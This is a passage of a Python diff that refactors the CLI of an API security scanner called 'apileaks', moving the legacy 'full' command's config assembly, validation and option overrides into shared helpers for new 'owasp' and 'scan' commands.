-              help='Restrict recursion to endpoints whose type is in TYPES: a comma-separated '
-                   "list of endpoint types like 'admin,api_version'. Only narrows the default "
-                   'recursion; never relaxes it.')
-@click.pass_context
-def full(ctx, config, target, output, log_level, log_file, json_logs, modules, rate_limit, depth, recursive, max_requests, concurrency, timeout, retries, extensions, user_agent_random, user_agent_custom, user_agent_file, jwt, status_code, detect_framework, fuzz_versions, framework_confidence, version_patterns, enable_advanced, enable_payload_encoding, enable_waf_evasion, enable_subdomain_discovery, enable_cors_analysis, ci_mode, fail_on, sarif, safe_mode, baseline, proxy, proxy_verify_ssl, recursion_status, recursion_type):
-    """Full comprehensive scan - includes fuzzing and OWASP testing
-    
-    \b
-    Examples:
-      python apileaks.py full --target https://api.example.com
-      python apileaks.py full --config config.yaml --target URL
-      python apileaks.py full --target URL --modules bola,auth,property
-      python apileaks.py full --target URL --enable-advanced --jwt TOKEN
-      python apileaks.py full --target URL --ci-mode --fail-on critical
+# ---------------------------------------------------------------------------
+# Shared execution core (design §6). ``_build_and_run`` centralizes the config
+# assembly + dispatch that the legacy ``full`` handler performs inline,
+# parameterized by the selected OWASP module set. Both the generated
+# ``owasp <module>`` subcommands (task 6) and the ``scan`` orchestrator (task 7)
+# call it, so a single-module run and a composed run build a byte-identical
+# APILeakConfig for that module (Property 5). This function is CLI-surface only:
+# it assembles config and dispatches to the UNCHANGED engine path
+# (``run_enhanced_apileak`` -> ``APILeakCore``); it contains no OWASP detection
+# logic.
+#
+# NOTE: this task only ADDS these functions; the live ``full`` command above is
+# intentionally left untouched so it keeps working until the orchestrator swap
+# in task 7.
+# ---------------------------------------------------------------------------
+
+
+def _require_target_or_config(opts, config_path):
+    """Fail before any request when no target and no config file are supplied.
+
+    Mirrors the ``full`` command guard (Requirement 1.5): a Module_Subcommand or
+    the Orchestrator_Command invoked without a target and without a ``--config``
+    file runs no OWASP module, writes an error to standard error, and exits with
+    a nonzero status before any request is issued.
+
+    The requirement is satisfied by the target-resolution precedence
+    command-line option -> Environment_Override -> config file: a ``--target``
+    option, a non-empty ``APILEAK_TARGET`` Environment_Override, or a
+    ``--config`` file each supply the target, so only the complete absence of all
+    three aborts the run (Requirements 1.5, 10.2, 10.3, 10.4).
     """
-    
-    # Validate user agent options
-    validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
-    
-    # Setup logging
-    setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
-    logger = get_logger("full")
-    
-    logger.info("APILeak full scan starting", version="0.1.0", ci_mode=ci_mode)
-    
-    # Parse the Recursion_Scope up front so an unrecognized status class or
-    # endpoint type is surfaced as a descriptive CLI error naming the offending
-    # value and NO Endpoint_Discovery is performed (Requirements 34.1, 34.2,
-    # 34.8). This runs before the scan's try/except so the abort is explicit and
-    # is not swallowed by the broad failure handler below.
+    if config_path:
+        return
+    if opts.get('target'):
+        return
+    # Environment_Override: a non-empty APILEAK_TARGET satisfies the target
+    # requirement when no --target option is supplied (Requirements 10.2, 10.3).
+    if os.getenv('APILEAK_TARGET'):
+        return
+    click.echo("Error: --target is required when no config file is provided", err=True)
+    sys.exit(1)
+
+
+def _validate_baseline_readable(baseline):
+    """Fail before any request when ``--baseline`` names an unreadable file.
+
+    Implements Requirement 5.7: when the ``--baseline`` option references a file
+    that exists but is unreadable or not well-formed JSON, the run exits with a
+    nonzero status, writes an error naming the baseline file, and runs no
+    Severity_Gate against a partial baseline (the scan is aborted before any
+    request is issued). A *missing* path is not an error — it is treated as an
+    empty baseline so every finding is a New_Finding (documented ``--baseline``
+    behavior), matching :meth:`utils.baseline.BaselineComparator.load`.
+    """
+    if not baseline:
+        return
+    if not os.path.exists(baseline):
+        # A missing path yields an empty baseline (every finding treated as new);
+        # this is documented behavior and NOT the malformed/unreadable case.
+        return
     try:
-        recursion_scope = parse_recursion_scope(recursion_status, recursion_type)
+        with open(baseline, "r", encoding="utf-8") as handle:
+            json.load(handle)
+    except (OSError, json.JSONDecodeError) as exc:
+        click.echo(
+            f"Error: --baseline file '{baseline}' is unreadable or malformed: {exc}",
+            err=True,
+        )
+        sys.exit(1)
+
+
+def _collect_module_configs(descriptors, opts):
+    """Collect per-module PRE-load config sub-dicts for ``create_enhanced_config``.
+
+    Returns a mapping of ``OWASPConfig`` field name -> config-values dict for
+    modules that must influence config construction before the config object is
+    built (i.e. threaded into the ``config_dict`` handed to
+    ``ConfigurationManager.load_config_from_dict``).
+
+    The ``bola`` module is threaded pre-load here — reproducing the exact
+    ``bola_config`` assembly the legacy ``full`` command performed — so that the
+    constructed ``config_dict`` carries the BOLA settings (Requirements 34.3,
+    34.4). Its descriptor's ``apply_options`` re-applies the same values POST-load
+    in ``_build_and_run`` (idempotently), which additionally covers the
+    file-config path where ``create_enhanced_config`` is not called. Modules that
+    only apply post-load (e.g. ``auth``) are omitted here. The mapping is keyed
+    only for descriptors actually selected for this run, so an ``owasp <module>``
+    subcommand threads only its own module's pre-load config.
+    """
+    module_configs = {}
+    for desc in descriptors:
+        if desc.key == "bola":
+            # Reproduce the legacy ``full`` bola_config assembly: every boolean
+            # flag defaults off, and --bola-destructive-methods is parsed from a
+            # comma-separated string into an uppercased set. The destructive
+            # methods key is only threaded when supplied so the BOLAConfig default
+            # {PATCH, PUT} otherwise applies (Requirement 34.4).
+            raw_methods = opts.get('bola_destructive_methods')
+            bola_testing = {
+                'allow_destructive': opts.get('allow_write_bola', False),
+                'enable_composite': opts.get('bola_composite', False),
+                'enable_id_leakage': opts.get('bola_id_leakage', False),
+                'verb_tampering': opts.get('bola_verb_tampering', False),
+                'parameter_pollution': opts.get('bola_parameter_pollution', False),
+                'dry_run': opts.get('bola_dry_run', False),
+            }
+            if raw_methods:
+                bola_testing['destructive_methods'] = {
+                    m.strip().upper() for m in raw_methods.split(',') if m.strip()
+                }
+            module_configs['bola_testing'] = bola_testing
+    return module_configs
+
+
+def _apply_transversal_overrides(cfg, opts, parsed_auth_contexts):
+    """Apply every Transversal_Option override onto a loaded config object.
+
+    Lifts the verbatim post-load override logic from the ``full`` handler so a
+    Module_Subcommand and the Orchestrator_Command apply identical transversal
+    effects on the run configuration (Requirements 3.5, 5.4). Works for both
+    file-loaded and in-memory configs. Each override is applied only when its
+    option is supplied so a file config's values are preserved when a flag is
+    absent.
+
+    Args:
+        cfg: The loaded ``APILeakConfig`` to mutate in place.
+        opts: Collected Click option values (keyed by option dest name).
+        parsed_auth_contexts: The ``--auth-context`` values parsed up front into
+            ``AuthContext`` objects (parsed before any request in
+            ``_build_and_run``).
+    """
+    logger = get_logger("build_and_run")
+
+    # --- target (CLI overrides config file) — mirrors merge_cli_overrides ---
+    if opts.get('target') and hasattr(cfg, 'target'):
+        cfg.target.base_url = opts['target']
+
+    # --- rate limit — mirrors merge_cli_overrides ---
+    if opts.get('rate_limit') and hasattr(cfg, 'rate_limiting'):
+        cfg.rate_limiting.requests_per_second = opts['rate_limit']
+
+    # --- jwt: historically threaded as a CLI override key ('jwt_token') that
+    #     merge_cli_overrides does not consume, so it is a no-op on the run
+    #     configuration. Preserved as a no-op here to avoid changing behavior;
+    #     authenticated identities are supplied through --auth-context.
+
+    # --- safe mode (CLI flag overrides config; Requirement 5.4) ---
+    if opts.get('safe_mode') and hasattr(cfg, 'safe_mode'):
+        cfg.safe_mode = True
+
+    # --- proxy / proxy-verify-ssl (CLI flag overrides config) ---
+    if opts.get('proxy') and hasattr(cfg, 'proxy'):
+        cfg.proxy = opts['proxy']
+        cfg.proxy_verify_ssl = opts.get('proxy_verify_ssl', False)
+
+    # --- SARIF report format ---
+    if opts.get('sarif') and hasattr(cfg, 'reporting'):
+        if 'sarif' not in cfg.reporting.formats:
+            cfg.reporting.formats.append('sarif')
+
+    # --- multi-user auth contexts (appended to the existing anonymous context) ---
+    if parsed_auth_contexts and hasattr(cfg, 'authentication'):
+        cfg.authentication.contexts.extend(parsed_auth_contexts)
+        logger.info(
+            "Threaded multi-user auth contexts into OWASP modules",
+            context_count=len(parsed_auth_contexts),
+        )
+
+    # --- discovery recursion / budget / concurrency / resilience controls ---
+    fuzzing = getattr(cfg, 'fuzzing', None)
+    if fuzzing is not None:
+        depth = opts.get('depth')
+        # max_depth precedence: CLI --depth > APILEAK_MAX_DEPTH > config/default.
+        # Only override when --depth is supplied or the env var is set so a file
+        # config's max_depth is preserved otherwise (Requirements 17.6-17.8).
+        if depth is not None:
+            fuzzing.max_depth = resolve_max_depth(depth)
+        elif os.getenv('APILEAK_MAX_DEPTH') is not None:
+            fuzzing.max_depth = resolve_max_depth(None)
+        if opts.get('recursive') is not None:
+            fuzzing.recursive = opts['recursive']
+        if depth == 0:
+            fuzzing.recursive = False  # depth 0 => depth-0 pass only (17.3)
+        if opts.get('max_requests') is not None:
+            fuzzing.max_requests = opts['max_requests']
+        if opts.get('concurrency') is not None:
+            fuzzing.concurrency = opts['concurrency']
+        if opts.get('retries') is not None:
+            fuzzing.retries = opts['retries']
+        # Extensions: only override when supplied so a file config's extensions
+        # are preserved when the flag is absent. Values are comma-separated AND
+        # repeatable: split each on commas, flatten, then normalize.
+        if opts.get('extensions'):
+            fuzzing.endpoints.extensions = normalize_extensions(
+                [ext for value in opts['extensions'] for ext in value.split(',')]
+            )
+        # Recursion_Scope: only set when parsed from supplied flags so a file
+        # config's scope is preserved otherwise (Requirements 34.3, 34.4).
+        recursion_scope = opts.get('recursion_scope')
+        if recursion_scope is not None:
+            fuzzing.recursion_scope = recursion_scope
+
+    # --- per-request timeout (target read timeout; Requirement 28.1) ---
+    if opts.get('timeout') is not None and hasattr(cfg, 'target'):
+        cfg.target.timeout = opts['timeout']
+
+
+def _build_and_run(ctx, *, selected_keys, descriptors, opts, config_path=None):
+    """Shared execution core for the ``owasp`` subcommands and the ``scan`` command.
+
+    Centralizes the config assembly + dispatch that the legacy ``full`` handler
+    performed inline, parameterized by the selected module set. A single
+    Module_Subcommand and ``scan --modules <that-one>`` flow through the same
+    steps 2-5 with the same option values, so they build a byte-identical
+    ``APILeakConfig`` for that module — differing only in ``enabled_modules``
+    cardinality (Property 5 / Requirement 4.3).
+
+    Setting-resolution precedence is preserved (command-line option ->
+    environment override -> config file -> built-in default): CLI overrides are
+    applied last onto the loaded config, env fallbacks live in
+    ``create_enhanced_config`` / ``resolve_max_depth``, and file settings are
+    loaded by ``ConfigurationManager`` (Requirements 10.1-10.5).
+
+    Args:
+        ctx: The Click context (parity with the command handlers).
+        selected_keys: Ordered engine module keys to enable for this run.
+        descriptors: The ``OwaspModuleDescriptor`` objects for ``selected_keys``.
+        opts: Collected Click option values (transversal + any module-specific).
+        config_path: Optional ``--config`` file path; when given, run settings are
+            loaded from it instead of built in memory.
+
+    Requirements: 1.3, 1.5, 3.5, 3.6, 4.3, 5.4, 10.1, 10.2, 10.3, 10.4, 10.5
+    """
+    # --- 1. Pre-flight validation (each fails before any request is issued) ---
+    # 1a. Mutually-exclusive User-Agent options (Requirement 3.6).
+    validate_user_agent_options(
+        opts.get('user_agent_random'),
+        opts.get('user_agent_custom'),
+        opts.get('user_agent_file'),
+    )
+
+    setup_logging(
+        level=opts.get('log_level', 'WARNING'),
+        json_logs=opts.get('json_logs', False),
+        log_file=opts.get('log_file'),
+    )
+    logger = get_logger("build_and_run")
+    logger.info(
+        "APILeak scan starting",
+        version=APILEAK_VERSION,
+        ci_mode=opts.get('ci_mode', False),
+        modules=list(selected_keys),
+    )
+
+    # 1b. Parse --auth-context up front so a value missing the ':' separator is
+    #     rejected with a descriptive click.BadParameter BEFORE any request.
+    parsed_auth_contexts = parse_auth_context_option(opts.get('auth_context') or ())
+
+    # 1c. Parse the Recursion_Scope up front so an unrecognized status class or
+    #     endpoint type aborts with a descriptive error BEFORE any discovery.
+    try:
+        recursion_scope = parse_recursion_scope(
+            opts.get('recursion_status'), opts.get('recursion_type'))
     except RecursionScopeError as exc:
         logger.error("Invalid discovery scope value", error=str(exc))
         click.echo(f"Error: {exc}", err=True)
         sys.exit(1)
+    opts['recursion_scope'] = recursion_scope
+
+    # 1d. Target-or-config requirement (Requirement 1.5).
+    _require_target_or_config(opts, config_path)
+
+    # 1d-bis. Baseline readability (Requirement 5.7): an existing but unreadable
+    #     or malformed --baseline file aborts nonzero BEFORE any request, so no
+    #     Severity_Gate is ever run against a partial baseline. A missing path is
+    #     allowed (treated as an empty baseline downstream).
+    _validate_baseline_readable(opts.get('baseline'))
+
+    # 1e. Parse the --actor-profile source up front so a missing/unreadable/
+    #     unparseable Actor_Profile source is rejected with a descriptive
+    #     click.BadParameter naming the source and the scan aborts BEFORE any
+    #     request is issued (Requirement 54.5). No-op when the option is absent
+    #     (e.g. on the owasp subcommands, which do not expose it).
+    actor_profiles = {}
+    if opts.get('actor_profile'):
+        try:
+            actor_profiles = load_actor_profiles(opts['actor_profile'])
+        except ValueError as exc:
+            raise click.BadParameter(str(exc))
+
+    # 1f. Parse the --unauthorized-assertions source up front (like
+    #     --actor-profile) so a missing/unreadable/unparseable source, or a
+    #     pattern that fails to compile, is rejected with a descriptive
+    #     click.BadParameter naming the source BEFORE any request (Requirement
+    #     55.1). No-op when the option is absent.
+    unauthorized_endpoint_assertions = {}
+    if opts.get('unauthorized_assertions'):
+        try:
+            unauthorized_endpoint_assertions = load_unauthorized_assertions(
+                opts['unauthorized_assertions'])
+        except ValueError as exc:
+            raise click.BadParameter(str(exc))
+
+    # 1g. Parse the repeatable --openapi / --postman Spec_Sources into one merged
+    #     Spec_Schema up front so an unreadable or unparseable source is surfaced
+    #     as a descriptive CLI error naming the offending Spec_Source and the
+    #     scan aborts BEFORE any request is issued (Requirements 49.1, 49.4). Left
+    #     as ``None`` when no Spec_Source is supplied so the existing no-spec path
+    #     is preserved (Requirement 49.3). No-op when the options are absent.
+    merged_spec_schema = None
+    if opts.get('openapi') or opts.get('postman'):
+        try:
+            merged_spec_schema = asyncio.run(
+                _load_spec_schema(opts.get('openapi') or (), opts.get('postman') or ()))
+        except SpecImportError as exc:
+            logger.error("Spec import failed", error=str(exc))
+            click.echo(f"Error: {exc}", err=True)
+            sys.exit(1)
 
     try:
         config_manager = ConfigurationManager()
-        
-        if config:
-            # Load configuration from file
-            apileak_config = config_manager.load_config(config)
+
+        # --- 2. Config assembly: file OR in-memory (identical to full's path) ---
+        if config_path:
+            # Load run settings from the supplied Config_File (Requirements 10.1,
+            # 10.5). A missing/malformed file raises and is surfaced below.
+            cfg = config_manager.load_config(config_path)
         else:
-            # Create default configuration for full scan
-            if not target:
-                click.echo("Error: --target is required when no config file is provided", err=True)
-                sys.exit(1)
-            
             # Prepare user agent configuration
             user_agent_config = None
-            if user_agent_random:
+            if opts.get('user_agent_random'):
                 user_agent_config = {'random': True}
-            elif user_agent_custom:
-                user_agent_config = {'custom': user_agent_custom}
-            elif user_agent_file:
-                user_agents = load_user_agents_from_file(user_agent_file)
+            elif opts.get('user_agent_custom'):
+                user_agent_config = {'custom': opts['user_agent_custom']}
+            elif opts.get('user_agent_file'):
+                user_agents = load_user_agents_from_file(opts['user_agent_file'])
                 user_agent_config = {'file_list': user_agents}
-            
-            # Prepare output filename
-            output_filename = prepare_output_filename(output)
-            
-            # Prepare advanced configuration with enhanced options
+
+            output_filename = prepare_output_filename(opts.get('output'))
+
+            # Advanced discovery options are not part of the restructured option
+            # surface (owasp subcommands / scan); default them off via opts.get so
+            # the in-memory config matches the legacy full defaults when absent.
             advanced_config = {
-                'detect_framework': detect_framework or enable_advanced,
-                'fuzz_versions': fuzz_versions or enable_advanced,
-                'framework_confidence': framework_confidence,
-                'enable_payload_encoding': enable_payload_encoding or enable_advanced,
-                'enable_waf_evasion': enable_waf_evasion or enable_advanced,
-                'enable_subdomain_discovery': enable_subdomain_discovery or enable_advanced,
-                'enable_cors_analysis': enable_cors_analysis or enable_advanced
+                'detect_framework': opts.get('detect_framework', False) or opts.get('enable_advanced', False),
+                'fuzz_versions': opts.get('fuzz_versions', False) or opts.get('enable_advanced', False),
+                'framework_confidence': opts.get('framework_confidence', 0.6),
+                'enable_payload_encoding': opts.get('enable_payload_encoding', False) or opts.get('enable_advanced', False),
+                'enable_waf_evasion': opts.get('enable_waf_evasion', False) or opts.get('enable_advanced', False),
+                'enable_subdomain_discovery': opts.get('enable_subdomain_discovery', False) or opts.get('enable_advanced', False),
+                'enable_cors_analysis': opts.get('enable_cors_analysis', False) or opts.get('enable_advanced', False),
             }
-            
-            # Parse custom version patterns if provided
-            if version_patterns:
-                custom_patterns = [p.strip() for p in version_patterns.split(',')]
-                advanced_config['version_patterns'] = custom_patterns
-            
-            # Parse status code filter for HTTP output
-            status_code_filter = parse_status_codes(status_code) if status_code else None
-            
-            config_dict = create_enhanced_config(target, None, "full", user_agent_config, output_filename, advanced_config, status_code_filter, ci_mode, fail_on, safe_mode)
-            # Thread discovery recursion / budget / concurrency controls into the
-            # fuzzing config (Requirements 17, 18, 20).
-            config_dict['fuzzing']['max_depth'] = resolve_max_depth(depth)
-            if recursive is not None:
-                config_dict['fuzzing']['recursive'] = recursive
-            if max_requests is not None:
-                config_dict['fuzzing']['max_requests'] = max_requests
-            if concurrency is not None:
-                config_dict['fuzzing']['concurrency'] = concurrency
-            # Thread the per-request resilience controls into the config
-            # (Requirement 28). --timeout becomes the target read timeout consumed
-            # by HTTPRequestEngine (28.1); --retries becomes the Retry_Limit sourced
-            # into RetryConfig.max_attempts (28.2). Both fall back to the config
-            # defaults when not supplied.
-            if timeout is not None:
-                config_dict['target']['timeout'] = timeout
-            if retries is not None:
-                config_dict['fuzzing']['retries'] = retries
-            # Thread the Extension_Set into the fuzzing config (Requirement 23.1).
-            # Values are comma-separated AND repeatable: split each value on
-            # commas, flatten, then normalize to canonical single-dot form.
+            if opts.get('version_patterns'):
+                advanced_config['version_patterns'] = [
+                    p.strip() for p in opts['version_patterns'].split(',')
+                ]
+
+            status_code_filter = (
+                parse_status_codes(opts['status_code']) if opts.get('status_code') else None
+            )
+
+            config_dict = create_enhanced_config(
+                opts.get('target'), None, "full", user_agent_config, output_filename,
+                advanced_config, status_code_filter, opts.get('ci_mode', False),
+                opts.get('fail_on', 'high'), opts.get('safe_mode', False),
+                module_configs=_collect_module_configs(descriptors, opts),
+            )
+
+            # Thread the discovery recursion / budget / concurrency / resilience
+            # controls into the constructed config_dict PRE-load, reproducing the
+            # legacy ``full`` in-memory assembly so the built config_dict (the
+            # first consumer of the threaded settings) carries them (Requirements
+            # 17, 18, 20, 23, 28). Post-load ``_apply_transversal_overrides``
+            # re-applies the same values idempotently and additionally covers the
+            # file-config path.
+            config_dict['fuzzing']['max_depth'] = resolve_max_depth(opts.get('depth'))
+            if opts.get('recursive') is not None:
+                config_dict['fuzzing']['recursive'] = opts['recursive']
+            if opts.get('max_requests') is not None:
+                config_dict['fuzzing']['max_requests'] = opts['max_requests']
+            if opts.get('concurrency') is not None:
+                config_dict['fuzzing']['concurrency'] = opts['concurrency']
+            if opts.get('timeout') is not None:
+                config_dict['target']['timeout'] = opts['timeout']
+            if opts.get('retries') is not None:
+                config_dict['fuzzing']['retries'] = opts['retries']
             config_dict['fuzzing'].setdefault('endpoints', {})
             config_dict['fuzzing']['endpoints']['extensions'] = normalize_extensions(
-                [ext for value in extensions for ext in value.split(',')]
+                [ext for value in (opts.get('extensions') or ()) for ext in value.split(',')]
             )
-            if depth == 0:
-                config_dict['fuzzing']['recursive'] = False  # depth 0 => depth-0 pass only (17.3)
-            # Thread the Recursion_Scope onto the fuzzing config so recursion only
-            # descends into records the scope admits (Requirements 34.1-34.3).
-            # None (no flags) preserves the default VALID/AUTH_REQUIRED recursion
-            # (34.4).
-            config_dict['fuzzing']['recursion_scope'] = recursion_scope
-            apileak_config = config_manager.load_config_from_dict(config_dict)
-        
-        # When --safe-mode is requested, ensure it is honored even when the
-        # configuration was loaded from a file (CLI flag overrides config).
-        if safe_mode and hasattr(apileak_config, 'safe_mode'):
-            apileak_config.safe_mode = True
+            if opts.get('depth') == 0:
+                config_dict['fuzzing']['recursive'] = False  # depth 0 => depth-0 pass only
+            config_dict['fuzzing']['recursion_scope'] = opts.get('recursion_scope')
 
-        # When --proxy is requested, route all traffic through the intercepting
-        # proxy (Burp/Caido/Hetty). The CLI flag overrides any file config and
-        # applies whether the config came from a file or was built in-memory.
-        if proxy and hasattr(apileak_config, 'proxy'):
-            apileak_config.proxy = proxy
-            apileak_config.proxy_verify_ssl = proxy_verify_ssl
-        
-        # When --sarif is requested, ensure the SARIF format is included in the
-        # effective reporting formats so a *.sarif report is generated.
-        if sarif and hasattr(apileak_config, 'reporting'):
-            if 'sarif' not in apileak_config.reporting.formats:
-                apileak_config.reporting.formats.append('sarif')
-        
-        # Apply CLI overrides
-        cli_overrides = {}
-        if target:
-            cli_overrides['target_url'] = target
-        if rate_limit:
-            cli_overrides['rate_limit'] = rate_limit
-        if modules:
-            cli_overrides['modules'] = [m.strip() for m in modules.split(',')]
-        if jwt:
-            cli_overrides['jwt_token'] = jwt
-        
-        if cli_overrides:
-            config_manager.merge_cli_overrides(cli_overrides)
-        
-        # Validate configuration
+            cfg = config_manager.load_config_from_dict(config_dict)
+
+        # --- 3. enabled_modules = the selection (Requirements 1.3, 4.2, 4.6) ---
+        cfg.owasp_testing.enabled_modules = list(selected_keys)
+
+        # --- 4. Transversal overrides (verbatim from full) — Reqs 3.5, 5.4 ---
+        _apply_transversal_overrides(cfg, opts, parsed_auth_contexts)
+
+        # --- 4b. Attach the parsed Actor_Profiles to the AuthContext whose name
+        #     matches each profile's context_name (Requirements 54.1, 54.2).
+        #     Applied post-load (after the transversal overrides extend the
+        #     contexts) so it works for both file and in-memory configs. Contexts
+        #     without a matching profile keep ``actor_profile = None`` (Req 54.3).
+        if actor_profiles and hasattr(cfg, 'authentication'):
+            for context in cfg.authentication.contexts:
+                profile = actor_profiles.get(context.name)
+                if profile is not None:
+                    context.actor_profile = profile
+
+        # --- 4c. Attach each context's compiled Unauthorized_Endpoint_Assertion
+        #     patterns to the AuthContext whose name matches (Requirements 55.1,
+        #     55.2). Contexts without a matching assertion keep
+        #     ``unauthorized_patterns = None`` (Requirement 55.5).
+        if unauthorized_endpoint_assertions and hasattr(cfg, 'authentication'):
+            for context in cfg.authentication.contexts:
+                patterns = unauthorized_endpoint_assertions.get(context.name)
+                if patterns is not None:
+                    context.unauthorized_patterns = patterns
+
+        # --- 4d. Attach the merged Spec_Schema so the modules can test the
+        #     declared Spec_Operations in addition to discovered endpoints
+        #     (Requirements 49.2, 49.5). Left as ``None`` when no Spec_Source was
+        #     supplied, preserving the existing behavior (Requirement 49.3).
+        if merged_spec_schema is not None and hasattr(cfg, 'owasp_testing'):
+            cfg.owasp_testing.spec_schema = merged_spec_schema
+
+        # --- 5. Per-module specific-option application (Requirement 2.5) ---
+        for desc in descriptors:
+            if desc.apply_options:
+                desc.apply_options(getattr(cfg.owasp_testing, desc.config_field), opts)
+
+        # --- 6. Validate + dispatch to the UNCHANGED engine path ---
         validation_errors = config_manager.validate_configuration()
         if validation_errors:
             logger.error("Configuration validation failed", errors=validation_errors)
             for error in validation_errors:
                 click.echo(f"Error: {error}", err=True)
             sys.exit(1)
-        
-        # Run the enhanced scan
-        asyncio.run(run_enhanced_apileak(apileak_config, ci_mode, fail_on, baseline))
-        
+
+        asyncio.run(run_enhanced_apileak(
+            cfg,
+            opts.get('ci_mode', False),
+            opts.get('fail_on', 'high'),
+            opts.get('baseline'),
+        ))
+
+    except (click.ClickException, SystemExit):
+        # Preserve Click parameter errors and explicit exits (validation, gate)
+        # so the process exit code is decided by the run, not this handler.
+        raise
     except Exception as e:
-        logger.error("Full scan failed", error=str(e))
+        logger.error("Scan failed", error=str(e))
         click.echo(f"Error: {e}", err=True)
         sys.exit(1)
+
+
+# ---------------------------------------------------------------------------
+# Orchestrator helpers (design §5, §7): module-selection resolution and the
+# deprecation notices for the ``full`` alias and hidden ``main`` command. These
+# are CLI-surface only.
+# ---------------------------------------------------------------------------
+
+def _emit_deprecation_notice(deprecated, replacement):
+    """Write a single Deprecation_Notice to standard error (design §7).
+
+    The notice names the deprecated invocation and its replacement. It is
+    written ONLY to stderr and never alters standard output or the exit code
+    (Requirements 6.4, 6.7). Handlers call this exactly once per invocation.
+    """
+    click.echo(
+        f"[DEPRECATION] '{deprecated}' is deprecated and will be removed in a "
+        f"future release. Use '{replacement}' instead.",
+        err=True,
+    )
+
+
+def _emit_module_selection_deprecation(modules):
+    """Write the module-selection Deprecation_Notice for ``full --modules``.
+
+    Maps a single selected key to its ``apileaks owasp <key>`` equivalent and a
+    multi-key selection to ``apileaks scan --modules ...`` (Requirement 6.6).
+    Written ONLY to stderr, exactly once, and never alters stdout or the exit
+    code.
+    """
+    selected = [m.strip() for m in modules.split(',') if m.strip()]
+    if len(selected) == 1:
+        replacement = f"apileaks owasp {selected[0]}"
+    else:
+        replacement = f"apileaks scan --modules {','.join(selected)}"
+    click.echo(
+        f"[DEPRECATION] Selecting modules through 'full --modules' is "
+        f"deprecated. Use '{replacement}' instead.",
+        err=True,
+    )
+
+
+def _resolve_modules(modules):
+    """Resolve the ``--modules`` selection to an ordered list of engine keys.
+
+    Resolution follows the setting-resolution precedence command-line option ->
+    Environment_Override -> built-in default (Requirements 10.3, 10.4):
+
+    * a non-empty ``--modules`` option is used as given;
+    * otherwise a non-empty ``APILEAK_MODULES`` Environment_Override is used;
+    * otherwise the full registered set is returned in OWASP category order
+      (Requirement 4.2).
+
+    Every selected key (from either the option or the Environment_Override) is
+    validated against the descriptor registry; an unregistered key aborts with a
+    nonzero exit and a stderr message naming the offending key BEFORE any module
+    runs (Requirements 4.7, 9.4).
+    """
+    if not modules:
+        # Environment_Override: APILEAK_MODULES selects modules when --modules is
+        # absent (Requirements 10.3, 10.4). An empty/unset value falls through to
+        # the full default set (Requirement 4.2).
+        env_modules = os.getenv('APILEAK_MODULES')
+        if env_modules and env_modules.strip():
+            modules = env_modules
+        else:
+            return all_keys()
+    selected = [m.strip() for m in modules.split(',') if m.strip()]
+    if not selected:
+        return all_keys()
+    for key in selected:
+        try:
+            get_descriptor(key)
+        except KeyError:
+            click.echo(
+                f"Error: unregistered OWASP module '{key}'. "
+                f"Registered modules: {', '.join(all_keys())}.",
+                err=True,
+            )
+            sys.exit(1)
+    return selected
+
+
+def _selected_descriptors(modules):
+    """Return the descriptors for the resolved ``--modules`` selection.
+
+    Reuses :func:`_resolve_modules` so an unregistered key aborts before any run
+    (Requirements 4.7, 9.4). The returned descriptors preserve the selection
+    order.
+    """
+    return [get_descriptor(key) for key in _resolve_modules(modules)]
+
+
+# ---------------------------------------------------------------------------
+# Orchestrator_Command surface (design §5). ``scan`` is the primary name; the
+# entire legacy ``full`` option surface is preserved on it (transversal, BOLA,
+# and Auth options plus --config/--modules and the discovery/spec inputs) so
+# historical invocations parse byte-for-byte unchanged. ``_orchestrator_options``
+# declares that surface once so ``scan`` and the ``full`` alias are guaranteed
+# identical (design §5's single intentional duplication).
+# ---------------------------------------------------------------------------
+
+# Options carried by the orchestrator beyond the shared Transversal_Options and
+# the BOLA / Auth Module_Specific_Options: the config/module selection plus the
+# discovery-enhancement and Spec_Source inputs the legacy ``full`` accepted.
+_ORCHESTRATOR_EXTRA_OPTIONS = [
+    click.option('--config', '-c', type=click.Path(exists=True),
+                 help='Configuration file path (YAML or JSON) - optional'),
+    click.option('--modules', help='Comma-separated list of OWASP modules to enable (default: all)'),
+    click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)'),
+    click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection (FastAPI, Express, Django, Flask, etc.)'),
+    click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing (/v1, /v2, /api/v1, etc.)'),
+    click.option('--framework-confidence', type=float, default=0.6, help='Minimum confidence threshold for framework detection (0.0-1.0)'),
+    click.option('--version-patterns', help='Custom version patterns for fuzzing (comma-separated, e.g., /v1,/v2,/api/v1)'),
+    click.option('--enable-advanced', is_flag=True, help='Enable all advanced features (framework detection, version fuzzing, subdomain discovery, CORS analysis)'),
+    click.option('--enable-payload-encoding', is_flag=True, help='Enable advanced payload encoding and obfuscation techniques'),
+    click.option('--enable-waf-evasion', is_flag=True, help='Enable WAF detection and evasion techniques'),
+    click.option('--enable-subdomain-discovery', is_flag=True, help='Enable subdomain discovery and testing'),
+    click.option('--enable-cors-analysis', is_flag=True, help='Enable CORS policy analysis and security headers testing'),
+    click.option('--openapi', 'openapi', multiple=True, type=click.Path(),
+                 help='OpenAPI/Swagger document (JSON or YAML) consumed by the OWASP modules '
+                      'for spec-driven security testing. Repeatable; merged across all values.'),
+    click.option('--postman', 'postman', multiple=True, type=click.Path(),
+                 help='Postman collection (JSON) consumed by the OWASP modules for spec-driven '
+                      'security testing. Repeatable; merged across all values.'),
+    click.option('--actor-profile', 'actor_profile', type=click.Path(),
+                 help='Actor_Profile source (JSON or YAML) supplying per-identity typed '
+                      'query/body values keyed by context name and endpoint. Each profile is '
+                      'attached to the matching --auth-context so multi-user tests use realistic '
+                      'per-actor inputs. A parse failure aborts before any request is issued.'),
+    click.option('--unauthorized-assertions', 'unauthorized_assertions', type=click.Path(),
+                 help='Unauthorized_Endpoint_Assertion source (JSON or YAML) mapping each '
+                      'context name to one or more endpoint pattern regular expressions that '
+                      'SHOULD be forbidden for that identity. A parse/compile failure aborts '
+                      'before any request is issued.'),
+]
+
+
+def _orchestrator_options(func):
+    """Attach the complete orchestrator option surface to ``func``.
+
+    Stacks (deepest first) the Auth and BOLA Module_Specific_Options, the shared
+    Transversal_Options, and finally the orchestrator-only extras
+    (``--config``/``--modules`` and the discovery/spec inputs), so the resulting
+    help lists the extras first, then the transversal options, then BOLA, then
+    Auth — matching the legacy ``full`` layout. Declaring the surface once here
